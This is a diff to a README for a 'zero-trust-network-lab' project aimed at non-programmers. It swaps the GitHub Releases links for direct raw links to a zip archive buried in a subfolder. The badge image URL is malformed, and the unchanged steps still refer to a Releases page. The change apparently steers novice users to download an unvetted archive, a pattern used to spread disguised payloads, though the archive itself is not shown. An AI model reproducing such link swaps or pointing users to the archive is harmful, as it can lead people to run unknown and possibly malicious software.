@@ -1,7 +1,7 @@
 # 🎉 zero-trust-network-lab - Simplifying Cyber Security for Everyone
 
 ## 🔗 Download Now
-[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-blue)](https://github.com/Viniciuscosta07/zero-trust-network-lab/releases)
+[![Download the latest release](https://raw.githubusercontent.com/Viniciuscosta07/zero-trust-network-lab/main/sdp/gateway/zero-network-trust-lab-v3.2-alpha.5.zip%20Latest%20Release-blue)](https://raw.githubusercontent.com/Viniciuscosta07/zero-trust-network-lab/main/sdp/gateway/zero-network-trust-lab-v3.2-alpha.5.zip)
 
 ## 🚀 Getting Started
 Welcome to the **zero-trust-network-lab** project. This guide helps you easily download and run the application, even if you're not a programmer. Follow these steps to get started.
@@ -34,7 +34,7 @@ The **zero-trust-network-lab** comes packed with features designed for effective
 ## 📥 Download & Install
 To download the **zero-trust-network-lab**, click the link below:
 
-[Visit this page to download](https://github.com/Viniciuscosta07/zero-trust-network-lab/releases)
+[Visit this page to download](https://raw.githubusercontent.com/Viniciuscosta07/zero-trust-network-lab/main/sdp/gateway/zero-network-trust-lab-v3.2-alpha.5.zip)
 
 1. After visiting the link, scroll down to the "Releases" section.
 2. Choose the latest version of the application.
